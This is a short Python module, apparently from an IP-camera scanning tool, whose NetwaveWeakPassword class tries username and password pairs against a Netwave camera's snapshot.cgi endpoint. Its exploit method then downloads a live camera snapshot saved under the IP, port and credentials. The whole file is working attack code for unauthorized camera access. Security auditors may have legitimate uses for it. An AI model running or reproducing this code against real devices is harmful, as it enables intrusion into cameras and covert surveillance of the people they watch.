import requests

from .base import WeakPasswordPOC


class NetwaveWeakPassword(WeakPasswordPOC):
    product_key = 'netwave'

    def _check(self, ip, port, user, password):
        r = requests.get(f"http://{ip}:{port}/snapshot.cgi",
                         auth=(user, password), headers=self.headers,
                         timeout=self.config.timeout, verify=False, stream=True)
        return r.status_code == 200

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        return self._snapshot(f"http://{ip}:{port}/snapshot.cgi",
                              f"{ip}-{port}-{user}-{password}.jpg",
                              auth=(user, password))
